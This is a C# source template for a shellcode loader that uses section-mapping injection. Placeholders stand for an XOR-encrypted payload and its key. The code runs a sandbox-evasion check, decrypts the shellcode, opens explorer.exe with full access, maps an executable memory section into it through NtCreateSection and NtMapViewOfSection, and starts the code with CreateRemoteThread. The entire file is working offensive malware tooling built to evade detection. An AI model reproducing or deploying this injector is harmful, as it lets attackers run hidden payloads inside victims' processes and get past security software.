using System;
using System.Runtime.InteropServices;

namespace SectionsInjection
{
    class Program
    {
        [DllImport("ntdll.dll", SetLastError = true, ExactSpelling = true)]
        static extern UInt32 NtCreateSection(ref IntPtr SectionHandle, UInt32 DesiredAccess, IntPtr ObjectAttributes, ref UInt32 MaximumSize, UInt32 SectionPageProtection, UInt32 AllocationAttributes, IntPtr FileHandle);

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern uint NtMapViewOfSection(IntPtr SectionHandle, IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, IntPtr CommitSize, out ulong SectionOffset, out uint ViewSize, uint InheritDisposition, uint AllocationType, uint Win32Protect);

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern uint NtUnmapViewOfSection(IntPtr hProc, IntPtr baseAddr);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        static void Main(string[] args)
        {
            // Sandbox evasion: VirtualAllocExNuma check
            IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
            if (mem == null)
            {
                return;
            }

            // XOR-encrypted shellcode
{{ csharp_payload | indent(12) }}

            // Decrypt shellcode
            for (int i = 0; i < buf.Length; i++)
            {
                buf[i] = (byte)(buf[i] ^ 0x{{ xor_key }});
            }

            // Find explorer.exe process
            int pid = 0;
            var procs = System.Diagnostics.Process.GetProcessesByName("explorer");
            if (procs.Length > 0)
            {
                pid = procs[0].Id;
            }
            else
            {
                Console.WriteLine("[-] Explorer process not found");
                return;
            }

            IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);
            Console.WriteLine($"[+] Got handle on PID {pid}: {hProcess}");

            // Create memory section
            IntPtr sectionHandle = IntPtr.Zero;
            uint size = (uint)buf.Length;
            uint PAGE_EXECUTE_READWRITE = 0x40;
            uint SEC_COMMIT = 0x8000000;

            UInt32 result = NtCreateSection(ref sectionHandle, 0x10000000, IntPtr.Zero, ref size, PAGE_EXECUTE_READWRITE, SEC_COMMIT, IntPtr.Zero);
            Console.WriteLine($"[+] NtCreateSection returned: {result:X}, handle: {sectionHandle}");

            // Map section into current process
            IntPtr localBaseAddress = IntPtr.Zero;
            ulong sectionOffset = 0;
            uint viewSize = 0;
            uint inheritDisposition = 2;

            result = NtMapViewOfSection(sectionHandle, GetCurrentProcess(), ref localBaseAddress, IntPtr.Zero, IntPtr.Zero, out sectionOffset, out viewSize, inheritDisposition, 0, PAGE_EXECUTE_READWRITE);
            Console.WriteLine($"[+] Mapped section to local process at: {localBaseAddress}, result: {result:X}");

            // Write shellcode to local section
            Marshal.Copy(buf, 0, localBaseAddress, buf.Length);
            Console.WriteLine($"[+] Wrote {buf.Length} bytes to local section");

            // Map same section into target process
            IntPtr remoteBaseAddress = IntPtr.Zero;
            result = NtMapViewOfSection(sectionHandle, hProcess, ref remoteBaseAddress, IntPtr.Zero, IntPtr.Zero, out sectionOffset, out viewSize, inheritDisposition, 0, PAGE_EXECUTE_READWRITE);
            Console.WriteLine($"[+] Mapped section to remote process at: {remoteBaseAddress}, result: {result:X}");

            // Unmap local view
            NtUnmapViewOfSection(GetCurrentProcess(), localBaseAddress);

            // Create remote thread
            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, remoteBaseAddress, IntPtr.Zero, 0, IntPtr.Zero);
            Console.WriteLine($"[+] Created remote thread: {hThread}");
        }
    }
}
